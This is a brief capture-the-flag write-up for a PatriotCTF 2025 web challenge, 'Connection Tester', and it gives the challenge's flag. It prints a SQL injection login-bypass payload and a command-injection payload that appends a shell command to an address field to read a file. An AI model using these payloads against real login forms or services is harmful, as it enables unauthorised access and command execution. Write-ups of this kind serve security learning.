# PatriotCTF 2025 - Connection Tester
## Category: Web
### Author: iamncloud9

---

### Exploitation
- The login function is bypassed through SQL injection, allowing an attacker to log in as an admin:
```
Username: ' OR '1'='1' --
Password: [random_pass]
```

- The Connect address feature in the admin dashboard contains a Command Injection vulnerability
- Payload:
```shell
127.0.0.1; cat flag.txt #
```
<img width="1494" height="523" alt="image" src="https://github.com/user-attachments/assets/6db3e699-1ccd-4421-bc99-66b65251d000" />

- After perform a command injection, the system reveal the Flag on screen

- Flag:
```
PCTF{C0nn3cti0n_S3cured}
```
